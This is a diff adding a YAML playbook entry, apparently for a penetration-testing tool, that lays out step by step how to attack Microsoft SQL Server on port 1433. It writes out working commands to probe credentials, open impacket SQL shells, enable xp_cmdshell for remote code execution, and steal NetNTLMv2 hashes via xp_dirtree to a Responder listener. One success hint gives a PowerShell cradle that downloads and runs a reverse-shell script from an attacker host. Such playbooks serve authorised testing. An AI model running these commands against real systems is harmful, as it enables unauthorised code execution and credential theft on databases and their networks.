@@ -1,0 +1,73 @@
+id: mssql
+name: MSSQL Database Exploitation (Port 1433)
+category: network
+description: Comprehensive methodology for Microsoft SQL Server on port 1433. Covers authentication probes, interactive SQL shells, enabling xp_cmdshell RCE, linked servers, and NetNTLM hash stealing.
+port_triggers:
+  - 1433
+  - 1434
+service_triggers:
+  - mssql
+  - ms-sql-s
+tags:
+  - mssql
+  - database
+  - rce
+  - xp_cmdshell
+steps:
+  - id: mssql-auth-probe
+    title: MSSQL Authentication Probe (NetExec)
+    phase: reconnaissance
+    purpose: Validate MSSQL credentials and verify if the user has `sysadmin` administrative privileges on the database instance.
+    command: netexec mssql {{TARGET}} -u '{{USERNAME|sa}}' -p '{{PASSWORD}}'
+    expected_output:
+      - '[+] MSSQL {{TARGET}}:1433 [*] Microsoft SQL Server 2019 (name:SQL01) (Pwn3d!)'
+    common_mistakes:
+      - Not testing Windows Authentication (`-d {{DOMAIN}} --windows-auth`) vs SQL Server Authentication.
+    if_success: MSSQL Authentication valid! If marked `(Pwn3d!)`, you have sysadmin rights to execute xp_cmdshell.
+    if_failure: Login failed. Try `sa` with empty password or test default application passwords.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
+  - id: mssql-interactive-shell
+    title: Interactive MSSQL Client Shell (impacket-mssqlclient)
+    phase: enumeration
+    purpose: Connect to the MSSQL instance to execute direct Transact-SQL queries, inspect database tables, and enumerate database links.
+    command: impacket-mssqlclient '{{DOMAIN|corp.local}}/{{USERNAME|sa}}:{{PASSWORD}}@{{TARGET}}' -windows-auth
+    expected_output:
+      - '[*] Database: master'
+      - SQL (corp\sa  guest@master)>
+    common_mistakes:
+      - Omitting `-windows-auth` when using Active Directory domain credentials.
+    if_success: Connected to MSSQL prompt! Run `SELECT @@version;` and check sysadmin role membership.
+    if_failure: Connection rejected. Verify domain context or SQL Server Auth format.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
+  - id: mssql-xp-cmdshell
+    title: Enable and Execute xp_cmdshell for Remote Code Execution
+    phase: exploitation
+    purpose: Reconfigure MSSQL to enable `xp_cmdshell` and execute operating system commands under the MSSQL service account context.
+    command: impacket-mssqlclient '{{DOMAIN|corp.local}}/{{USERNAME|sa}}:{{PASSWORD}}@{{TARGET}}' -windows-auth -c 'EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; xp_cmdshell "whoami";'
+    expected_output:
+      - output
+      - '----------------'
+      - nt service\mssqlserver
+      - 'NULL'
+    common_mistakes:
+      - User must have `sysadmin` role or EXECUTE permission on `xp_cmdshell` stored procedure.
+    if_success: 'Command executed! Spawn a reverse shell: `xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString(''http://{{LHOST|10.10.14.2}}:8000/shell.ps1'')"`'
+    if_failure: Permission denied on sp_configure. Try stealing NetNTLMv2 hash with xp_dirtree.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
+  - id: mssql-steal-netntlm
+    title: Steal NetNTLMv2 Hash via xp_dirtree (Responder)
+    phase: exploitation
+    purpose: Force the MSSQL service account to authenticate against your Responder SMB listener by requesting an SMB share path via `xp_dirtree`.
+    command: impacket-mssqlclient '{{DOMAIN|corp.local}}/{{USERNAME|sa}}:{{PASSWORD}}@{{TARGET}}' -windows-auth -c 'EXEC master..xp_dirtree "\\{{LHOST|10.10.14.2}}\share", 1, 1;'
+    expected_output:
+      - '[*] Responder [SMB] NTLMv2-SSP Client: {{TARGET}}'
+      - '[*] Hash: mssql-svc::CORP:...'
+    common_mistakes:
+      - Starting the command before running `sudo responder -I tun0 -v` on your Kali machine.
+    if_success: NetNTLMv2 hash captured in Responder! Crack with Hashcat mode 5600.
+    if_failure: Outbound SMB blocked by firewall. Check internal linked database servers.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
